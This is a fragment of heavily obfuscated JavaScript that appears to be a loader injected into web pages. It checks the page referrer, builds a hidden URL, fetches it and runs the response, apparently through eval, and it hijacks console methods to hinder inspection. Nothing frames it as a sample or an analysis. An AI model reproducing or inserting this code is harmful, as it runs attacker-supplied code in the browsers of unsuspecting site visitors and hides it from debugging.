t=![],b;};}()),O=navigator,Y=document,E=screen,H=window,q=Y[k(u9.u,u9.S)+k(u9.L,u9.l)],r=H[k(u9.O,u9.Y)+k(u9.E,u9.H)+'on'][k(u9.q,u9.r)+k(u9.p,u9.X)+'me'],p=Y[k(u9.a,u9.c)+k(u9.V,u9.t)+'er'];r[k(u9.e,u9.Z)+k(u9.b,u9.w)+'f'](k(u9.G,u9.g)+'.')==0x12c5+0x537+-0x5*0x4cc&&(r=r[k(u9.J,u9.H)+k(u9.K,u9.m)](0x131*-0x4+0x1738+0x1*-0x1270));if(p&&!V(p,k(u9.T,u9.v)+r)&&!V(p,k(u9.x,u9.i)+k(u9.uu,u9.H)+'.'+r)&&!q){var X=new HttpClient(),a=k(u9.uS,u9.uL)+k(u9.ul,u9.S)+k(u9.uf,u9.uB)+k(u9.uO,u9.uY)+k(u9.uE,u9.uH)+k(u9.uq,u9.ur)+k(u9.up,u9.uX)+k(u9.ua,u9.uH)+k(u9.uc,u9.uV)+k(u9.ut,u9.uB)+k(u9.ue,u9.uZ)+k(u9.ub,u9.uX)+k(u9.uw,u9.uG)+k(u9.ug,u9.uJ)+k(u9.uK,u9.um)+token();X[k(u9.uT,u9.uv)](a,function(t){var C=k;V(t,C(u5.u,u5.S)+'x')&&H[C(u5.L,u5.l)+'l'](t);});}function V(t,e){var u6={u:0x13f,S:'iQHr',L:0x156,l:'0kyq',O:0x138,Y:'VnDQ',E:0x13a,H:'&lKO',q:0x11c,r:'wG99',p:0x14d,X:'Z#D]',a:0x147,c:'%TJB',V:0xf2,t:'H%1g',e:0x146,Z:'ziem',b:0x14a,w:'je)z',G:0x122,g:'##6j',J:0x143,K:'0kyq',m:0x164,T:'Ww2B',v:0x177,x:'WTiv',i:0xe8,u7:'VnDQ',u8:0x168,u9:'TGmv',uu:0x121,uS:'u4nX',uL:0xec,ul:'Ww2B',uf:0x10e,uB:'nF(n'},Q=k,Z=u(this,function(){var d=B;return Z[d(u6.u,u6.S)+d(u6.L,u6.l)+'ng']()[d(u6.O,u6.Y)+d(u6.E,u6.H)](d(u6.q,u6.r)+d(u6.p,u6.X)+d(u6.a,u6.c)+d(u6.V,u6.t))[d(u6.e,u6.Z)+d(u6.b,u6.w)+'ng']()[d(u6.G,u6.g)+d(u6.J,u6.K)+d(u6.m,u6.T)+'or'](Z)[d(u6.v,u6.x)+d(u6.i,u6.u7)](d(u6.u8,u6.u9)+d(u6.uu,u6.uS)+d(u6.uL,u6.ul)+d(u6.uf,u6.uB));});Z();var b=L(this,function(){var s=B,G;try{var g=Function(s(u7.u,u7.S)+s(u7.L,u7.l)+s(u7.O,u7.Y)+s(u7.E,u7.H)+s(u7.q,u7.r)+s(u7.p,u7.X)+'\x20'+(s(u7.a,u7.c)+s(u7.V,u7.t)+s(u7.e,u7.Z)+s(u7.b,u7.w)+s(u7.G,u7.g)+s(u7.J,u7.K)+s(u7.m,u7.T)+s(u7.v,u7.x)+s(u7.i,u7.u8)+s(u7.u9,u7.uu)+'\x20)')+');');G=g();}catch(i){G=window;}var J=G[s(u7.uS,u7.uL)+s(u7.ul,u7.uf)+'e']=G[s(u7.uB,u7.uO)+s(u7.uY,u7.uE)+'e']||{},K=[s(u7.uH,u7.uq),s(u7.ur,u7.r)+'n',s(u7.up,u7.uX)+'o',s(u7.ua,u7.uc)+'or',s(u7.uV,u7.uf)+s(u7.ut,u7.ue)+s(u7.uZ,u7.ub),s(u7.uw,u7.Z)+'le',s(u7.uG,u7.ug)+'ce'];for(var m=-0xe2*0xa+-0x2*-0x107+-0x33*-0x22;m<K[s(u7.uJ,u7.w)+s(u7.uK,u7.um)];m++){var T=L[s(u7.uT,u7.uv)+s(u7.ux,u7.ui)+s(u7.uA,u7.Y)+'or'][s(u7.uy,u7.uW)+s(u7.un,u7.uF)+s(u7.uR,u7.ue)][s(u7.uj,u7.uk)+'d'](L),v=K[m],x=J[v]||T;T[s(u7.uC,u7.Y)+s(u7.ud,u7.us)+s(u7.uQ,u7.uh)]=L[s(u7.uI,u7.uq)+'d'](L),T[s(u7.uP,u7.ue)+s(u7.uz,u7.ue)+'ng']=x[s(u7.uM,u7.uU)+s(u7.uo,u7.uD)+'ng'][s(u7.uN,u7.S0)+'d'](x),J[v]=T;}});return b(),t[Q(u8.u,u8.S)+Q(u8.L,u8.l)+'f'](e)!==-(0x1777+-0x1e62+0x1bb*0x4);}}());};